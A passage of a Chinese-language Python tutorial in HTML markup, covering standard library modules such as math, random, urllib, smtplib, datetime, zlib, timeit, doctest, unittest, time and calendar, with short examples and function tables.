class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数学\"><a href=\"#数学\" class=\"headerlink\" title=\"数学\"></a>数学</h3><p>math模块为浮点运算提供了对底层C函数库的访问</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> math\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>cos<span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi <span class=\"token operator\">/</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 0.70710678118654757</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 10.0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>random提供了生成随机数的工具</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'pear'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'banana'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 'apple'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>sample<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># sampling without replacement</span>\n<span class=\"token comment\"># [30, 83, 16, 4, 8, 81, 41, 50, 18, 33]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># random float</span>\n<span class=\"token comment\"># 0.17970987693706186</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># random integer chosen from range(6)</span>\n<span class=\"token comment\"># 3</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"访问互联网\"><a href=\"#访问互联网\" class=\"headerlink\" title=\"访问互联网\"></a>访问互联网</h3><p>有几个模块用于访问互联网以及处理网络通信协议，处理从 urls 接收的数据的 urllib.request 以及用于发送电子邮件的 smtplib</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> urllib<span class=\"token punctuation\">.</span>request <span class=\"token keyword\">import</span> urlopen\n\n<span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> urlopen<span class=\"token punctuation\">(</span><span class=\"token string\">'http://tycho.usno.navy.mil/cgi-bin/timer.pl'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># Decoding the binary data to text.</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'EST'</span> <span class=\"token keyword\">in</span> line <span class=\"token keyword\">or</span> <span class=\"token string\">'EDT'</span> <span class=\"token keyword\">in</span> line<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># look for Eastern Time</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># &lt;BR&gt;Nov. 25, 09:43:32 PM EST</span>\n\n<span class=\"token keyword\">import</span> smtplib\n\nserver <span class=\"token operator\">=</span> smtplib<span class=\"token punctuation\">.</span>SMTP<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">)</span>\nserver<span class=\"token punctuation\">.</span>sendmail<span class=\"token punctuation\">(</span><span class=\"token string\">'soothsayer@example.org'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'jcaesar@example.org'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token triple-quoted-string string\">\"\"\"To: jcaesar@example.org\nFrom: soothsayer@example.org\n\nBeware the Ides of March.\n\"\"\"</span><span class=\"token punctuation\">)</span>\nserver<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"日期和时间\"><a href=\"#日期和时间\" class=\"headerlink\" title=\"日期和时间\"></a>日期和时间</h3><p>datetime模块为日期和时间处理</p>\n<p>该模块还支持时区处理</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># dates are easily constructed and formatted</span>\n<span class=\"token keyword\">from</span> datetime <span class=\"token keyword\">import</span> date\nnow <span class=\"token operator\">=</span> date<span class=\"token punctuation\">.</span>today<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>now<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2021-09-26</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>now<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">\"%m-%d-%y. %d %b %Y is a %A on the %d day of %B.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 09-26-21. 26 Sep 2021 is a Sunday on the 26 day of September.</span>\n\n<span class=\"token comment\"># dates support calendar arithmetic</span>\nbirthday <span class=\"token operator\">=</span> date<span class=\"token punctuation\">(</span><span class=\"token number\">1964</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span>\nage <span class=\"token operator\">=</span> now <span class=\"token operator\">-</span> birthday\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>age<span class=\"token punctuation\">.</span>days<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 20876</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数据压缩\"><a href=\"#数据压缩\" class=\"headerlink\" title=\"数据压缩\"></a>数据压缩</h3><p>以下模块直接支持通用的数据打包和压缩格式：zlib，gzip，bz2，zipfile，以及 tarfile</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> zlib\ns <span class=\"token operator\">=</span> <span class=\"token string\">b'witch which has which witches wrist watch'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 41</span>\nt <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span>compress<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 37</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zlib<span class=\"token punctuation\">.</span>decompress<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># b'witch which has which witches wrist watch'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 226805979</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"性能度量\"><a href=\"#性能度量\" class=\"headerlink\" title=\"性能度量\"></a>性能度量</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> timeit <span class=\"token keyword\">import</span> Timer\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Timer<span class=\"token punctuation\">(</span><span class=\"token string\">'t=a; a=b; b=t'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a=1; b=2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timeit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 0.032305799999999996</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Timer<span class=\"token punctuation\">(</span><span class=\"token string\">'a,b = b,a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a=1; b=2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timeit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 0.025154800000000005</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"测试模块\"><a href=\"#测试模块\" class=\"headerlink\" title=\"测试模块\"></a>测试模块</h3><p>doctest模块提供了一个工具，扫描模块并根据程序中内嵌的文档字符串执行测试</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">average</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"Computes the arithmetic mean of a list of numbers.\n\n    &gt;&gt;&gt; print(average([20, 30, 70]))\n    40.0\n    \"\"\"</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">import</span> doctest\ndoctest<span class=\"token punctuation\">.</span>testmod<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 自动验证嵌入测试</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>unittest模块不像 doctest模块那么容易使用，不过它可以在一个独立的文件里提供一个更全面的测试集</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> unittest\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">TestStatisticalFunctions</span><span class=\"token punctuation\">(</span>unittest<span class=\"token punctuation\">.</span>TestCase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">test_average</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>assertEqual<span class=\"token punctuation\">(</span>average<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40.0</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>assertEqual<span class=\"token punctuation\">(</span><span class=\"token builtin\">round</span><span class=\"token punctuation\">(</span>average<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.3</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>assertRaises<span class=\"token punctuation\">(</span>ZeroDivisionError<span class=\"token punctuation\">,</span> average<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>assertRaises<span class=\"token punctuation\">(</span>TypeError<span class=\"token punctuation\">,</span> average<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">)</span>\n\nunittest<span class=\"token punctuation\">.</span>main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># Calling from the command line invokes all tests</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"时间和日期\"><a href=\"#时间和日期\" class=\"headerlink\" title=\"时间和日期\"></a>时间和日期</h2><ol>\n<li>每个时间戳都以自从1970年1月1日午夜（历元）经过了多长时间来表示</li>\n<li>时间间隔是以秒为单位的浮点小数</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time  <span class=\"token comment\"># 引入time模块</span>\n\nticks <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前时间戳为:\"</span><span class=\"token punctuation\">,</span> ticks<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 当前时间戳为: 1632676717.5455847</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"时间元组\"><a href=\"#时间元组\" class=\"headerlink\" title=\"时间元组\"></a>时间元组</h3><table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th>字段</th>\n<th align=\"left\">属性</th>\n<th align=\"left\">值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td>4位数年</td>\n<td align=\"left\">tm_year</td>\n<td align=\"left\">2008</td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td>月</td>\n<td align=\"left\">tm_mon</td>\n<td align=\"left\">1 到 12</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td>日</td>\n<td align=\"left\">tm_mday</td>\n<td align=\"left\">1 到 31</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td>小时</td>\n<td align=\"left\">tm_hour</td>\n<td align=\"left\">0 到 23</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td>分钟</td>\n<td align=\"left\">tm_min</td>\n<td align=\"left\">0 到 59</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td>秒</td>\n<td align=\"left\">tm_sec</td>\n<td align=\"left\">0 到 61 (60或61 是闰秒)</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td>一周的第几日</td>\n<td align=\"left\">tm_wday</td>\n<td align=\"left\">0到6 (0是周一)</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td>一年的第几日</td>\n<td align=\"left\">tm_yday</td>\n<td align=\"left\">1 到 366(儒略历)</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td>夏令时</td>\n<td align=\"left\">tm_isdst</td>\n<td align=\"left\">-1, 0, 1, -1是决定是否为夏令时的旗帜</td>\n</tr>\n</tbody></table>\n<h3 id=\"获取当前时间\"><a href=\"#获取当前时间\" class=\"headerlink\" title=\"获取当前时间\"></a>获取当前时间</h3><p>从返回浮点数的时间戳方式向时间元组转换，只要将浮点数传递给如localtime之类的函数</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\nlocaltime <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本地时间为 :\"</span><span class=\"token punctuation\">,</span> localtime<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 本地时间为 : time.struct_time(tm_year=2021, tm_mon=9, tm_mday=27, tm_hour=1, tm_min=24, tm_sec=5, tm_wday=0, tm_yday=270, tm_isdst=0)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"获取格式化的时间\"><a href=\"#获取格式化的时间\" class=\"headerlink\" title=\"获取格式化的时间\"></a>获取格式化的时间</h3><p>获取可读的时间模式的函数是asctime()</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\nlocaltime <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>asctime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本地时间为 :\"</span><span class=\"token punctuation\">,</span> localtime<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 本地时间为 : Mon Sep 27 01:25:32 2021</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"格式化日期\"><a href=\"#格式化日期\" class=\"headerlink\" title=\"格式化日期\"></a>格式化日期</h3><p>time 模块的 strftime 方法来格式化日期</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\n<span class=\"token comment\"># 格式化成2016-03-20 11:45:39形式</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">\"%Y-%m-%d %H:%M:%S\"</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 格式化成Sat Mar 28 22:24:24 2016形式</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">\"%a %b %d %H:%M:%S %Y\"</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 将格式字符串转换为时间戳</span>\na <span class=\"token operator\">=</span> <span class=\"token string\">\"Sat Mar 28 22:24:24 2016\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>mktime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strptime<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%a %b %d %H:%M:%S %Y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n2021-09-27 01:28:18\nMon Sep 27 01:28:18 2021\n1459175064.0\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>python中时间日期格式化符号</p>\n<ul>\n<li>%y 两位数的年份表示（00-99）</li>\n<li>%Y 四位数的年份表示（000-9999）</li>\n<li>%m 月份（01-12）</li>\n<li>%d 月内中的一天（0-31）</li>\n<li>%H 24小时制小时数（0-23）</li>\n<li>%I 12小时制小时数（01-12）</li>\n<li>%M 分钟数（00-59）</li>\n<li>%S 秒（00-59）</li>\n<li>%a 本地简化星期名称</li>\n<li>%A 本地完整星期名称</li>\n<li>%b 本地简化的月份名称</li>\n<li>%B 本地完整的月份名称</li>\n<li>%c 本地相应的日期表示和时间表示</li>\n<li>%j 年内的一天（001-366）</li>\n<li>%p 本地A.M.或P.M.的等价符</li>\n<li>%U 一年中的星期数（00-53）星期天为星期的开始</li>\n<li>%w 星期（0-6），星期天为星期的开始</li>\n<li>%W 一年中的星期数（00-53）星期一为星期的开始</li>\n<li>%x 本地相应的日期表示</li>\n<li>%X 本地相应的时间表示</li>\n<li>%Z 当前时区的名称</li>\n<li>%% %号本身</li>\n</ul>\n<h3 id=\"获取某月日历\"><a href=\"#获取某月日历\" class=\"headerlink\" title=\"获取某月日历\"></a>获取某月日历</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> calendar\n\ncal <span class=\"token operator\">=</span> calendar<span class=\"token punctuation\">.</span>month<span class=\"token punctuation\">(</span><span class=\"token number\">2016</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"以下输出2016年1月份的日历:\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cal<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n以下输出2016年1月份的日历:\n    January 2016\nMo Tu We Th Fr Sa Su\n             1  2  3\n 4  5  6  7  8  9 10\n11 12 13 14 15 16 17\n18 19 20 21 22 23 24\n25 26 27 28 29 30 31\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Time-模块\"><a href=\"#Time-模块\" class=\"headerlink\" title=\"Time 模块\"></a>Time 模块</h3><p>Time 模块包含了以下内置函数，既有时间处理的，也有转换时间格式的</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">函数及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-altzone.html\">time.altzone</a> 返回格林威治西部的夏令时地区的偏移秒数。如果该地区在格林威治东部会返回负值（如西欧，包括英国）。对夏令时启用地区才能使用。</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\">[time.asctime(<a href=\"https://www.runoob.com/python/att-time-asctime.html\">tupletime])</a> 接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-clock.html\">time.clock( )</a> 用以浮点数计算的秒数返回当前的CPU时间。用来衡量不同程序的耗时，比time.time()更有用。</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\">[time.ctime(<a href=\"https://www.runoob.com/python/att-time-ctime.html\">secs])</a> 作用相当于asctime(localtime(secs))，未给参数相当于asctime()</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\">[time.gmtime(<a href=\"https://www.runoob.com/python/att-time-gmtime.html\">secs])</a> 接收时间戳（1970纪元后经过的浮点秒数）并返回格林威治天文时间下的时间元组t。注：t.tm_isdst始终为0</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\">[time.localtime(<a href=\"https://www.runoob.com/python/att-time-localtime.html\">secs])</a> 接收时间戳（1970纪元后经过的浮点秒数）并返回当地时间下的时间元组t（t.tm_isdst可取0或1，取决于当地当时是不是夏令时）。</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-mktime.html\">time.mktime(tupletime)</a> 接受时间元组并返回时间戳（1970纪元后经过的浮点秒数）。</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-sleep.html\">time.sleep(secs)</a> 推迟调用线程的运行，secs指秒数。</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\">[time.strftime(fmt<a href=\"https://www.runoob.com/python/att-time-strftime.html\">,tupletime])</a> 接收以时间元组，并返回以可读字符串表示的当地时间，格式由fmt决定。</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-strptime.html\">time.strptime(str,fmt=’%a %b %d %H:%M:%S %Y’)</a> 根据fmt的格式把一个时间字符串解析为时间元组。</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-time.html\">time.time( )</a> 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。</td>\n</tr>\n<tr>\n<td align=\"left\">12</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python/att-time-tzset.html\">time.tzset()</a> 根据环境变量TZ重新初始化时间相关设置。</td>\n</tr>\n</tbody></table>\n<p>Time模块包含了以下2个非常重要的属性：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">属性及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><strong>time.timezone</strong> 属性 time.timezone 是当地时区（未启动夏令时）距离格林威治的偏移秒数（&gt;0，美洲&lt;=0大部分欧洲，亚洲，非洲）。</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><strong>time.tzname</strong> 属性time.tzname包含一对根据情况的不同而不同的字符串，分别是带夏令时的本地时区名称，和不带的。</td>\n</tr>\n</tbody></table>\n<h3 id=\"日历（Calendar）模块\"><a href=\"#日历（Calendar）模块\" class=\"headerlink\" title=\"日历（Calendar）模块\"></a>日历（Calendar）模块</h3><p>此模块的函数都是日历相关的，例如打印某月的字符月历。</p>\n<p>星期一是默认的每周第一天，星期天是默认的最后一天。更改设置需调用calendar.setfirstweekday()函数。模块包含了以下内置函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">函数及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><strong>calendar.calendar(year,w=2,l=1,c=6)</strong> 返回一个多行字符串格式的year年年历，3个月一行，间隔距离为c。 每日宽度间隔为w字符。每行长度为21* W+18+2* C。l是每星期行数。</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><strong>calendar.firstweekday( )</strong> 返回当前每周起始日期的设置。默认情况下，首次载入 calendar 模块时返回 0，即星期一。</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><strong>calendar.isleap(year)</strong> 是闰年返回 True，否则为 False。<code>&gt;&gt;&gt; import calendar &gt;&gt;&gt; print(calendar.isleap(2000)) True &gt;&gt;&gt; print(calendar.isleap(1900)) False</code></td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><strong>calendar.leapdays(y1,y2)</strong> 返回在Y1，Y2两年之间的闰年总数。</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\"><strong>calendar.month(year,month,w=2,l=1)</strong> 返回一个多行字符串格式的year年month月日历，两行标题，一周一行。每日宽度间隔为w字符。每行的长度为7* w+6。l是每星期的行数。</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td 